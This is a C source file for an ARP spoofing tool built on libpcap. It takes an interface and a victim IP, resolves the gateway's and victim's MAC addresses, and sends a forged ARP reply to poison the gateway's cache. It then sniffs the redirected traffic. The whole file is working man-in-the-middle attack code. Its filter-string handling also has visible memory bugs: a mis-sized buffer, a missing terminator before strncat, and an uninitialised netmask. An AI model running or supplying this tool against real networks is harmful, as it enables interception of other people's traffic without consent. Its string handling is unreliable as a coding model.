#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "arp.h"
#include <netinet/ether.h>

int main(int argc, char *argv[]) {
    u_char *packet = NULL;
    struct pcap_pkthdr hdr;
    char *interface = NULL;
    char *victim_ip = NULL;
    char ip[4];
    char mac[ETH_ALEN];
    pcap_t *handler = NULL;    
    struct bpf_program fp;      /* hold compiled program     */
    //char *filter_string = "dst host 192.168.14.2";
    char *filter_arp = "arp";
    char *filter = "arp src ";

    bpf_u_int32 netp;           /* ip                        */

    /* check arg */
    if(argc != 3) {
        fprintf(stderr, "usage: ./arp_spoof <interface> <victim's ip>");
        return -1;
    }
    interface = argv[1]; 
    victim_ip = argv[2];
    inet_aton(victim_ip, &my_arp.victim_ip);
    /* show nic on my computer */
    get_dev_list(&dev_list);
    show_dev_list(dev_list);
    printf("\n");

    /* create handler and set filter */
    handler = pcap_open_live(interface, BUFSIZ, 0, 10, error_buffer);
    if(NULL == handler) {
        printf("pcap_open_live(): %s\n", error_buffer);
        return -1;
    }
    if(pcap_compile(handler, &fp, filter_arp, 0, netp) == -1) {
        fprintf(stderr,"Error calling pcap_compile: %s\n", error_buffer); 
        exit(1);
    }
    // Set the filter for the pcap handle through the compiled program
    if (pcap_setfilter(handler, &fp) == -1) {
        fprintf(stderr,"Error setting filter: %s\n", error_buffer); 
        exit(1); 
    }
    /* 1. get interface's mac address */
    if(get_ip(interface, &my_arp.interface_ip)) {
        printf("%s's ip address is %s\n", interface, inet_ntoa(my_arp.interface_ip));
    }
    if(get_mac_from_terminal(interface, &my_arp.interface_mac)) {
        printf("%s's mac address is %s\n", interface, ether_ntoa(&my_arp.interface_mac));
    }
    printf("\n");

    /* 2. get gateway's mac address */
    printf("getting gateway mac...\n");
    get_gateway_ip(&my_arp.gateway_ip);
    printf("gateway ip is %s\n", inet_ntoa(my_arp.gateway_ip));
    send_arp_packet(handler, &my_arp.interface_mac, &my_arp.interface_ip, &my_arp.interface_mac, &my_arp.gateway_ip, ARP_QUERY);
    packet = pcap_next(handler, &hdr);
    if(packet == NULL) {
        printf("Didn't grab packet\n");
    } else {
        get_mac_from_arp(packet, &my_arp.gateway_mac);
    }
    printf("\n");
    /* 3. get victim's mac address */
    printf("getting victim mac...\n");
    send_arp_packet(handler, &my_arp.interface_mac, &my_arp.interface_ip, &my_arp.interface_mac, &my_arp.victim_ip, ARP_QUERY);
    packet = pcap_next(handler, &hdr);
    if(packet == NULL) {
        printf("Didn't grab packet\n");
    } else {
        get_mac_from_arp(packet, &my_arp.victim_mac);
    }
    printf("\n");
    /* 4. send false arp packet to the victim */
    printf("arp spoof start...\n");
    //send_arp_packet(handler, &my_arp.interface_mac, &my_arp.gateway_ip, &my_arp.victim_mac, &my_arp.victim_ip, ARP_ANS);
    send_arp_packet(handler, &my_arp.interface_mac, &my_arp.victim_ip, &my_arp.gateway_mac, &my_arp.gateway_ip, ARP_ANS);
    printf("\n");
    /* 5. listen to victim's packet afterwards */
    char *filter_string = (char *) malloc((strlen(filter) + strlen(argv[2]) + 1));
    memcpy(filter_string, filter, strlen(filter));
    strncat(filter_string, inet_ntoa(my_arp.gateway_ip), strlen(inet_ntoa(my_arp.gateway_ip)));
    printf("wait the hooking...\n");
    printf("the filter is %s\n", filter_string);
    if(pcap_compile(handler, &fp, filter_string, 0, netp) == -1) {
        fprintf(stderr,"Error calling pcap_compile: %s\n", error_buffer); 
        exit(1);
    }
    // Set the filter for the pcap handle through the compiled program
    if (pcap_setfilter(handler, &fp) == -1) {
        fprintf(stderr,"Error setting filter: %s\n", error_buffer); 
        exit(1); 
    }
    pcap_loop(handler, 0, handle_packet, handler);

    /* free resource */
    pcap_freealldevs(dev_list);
}
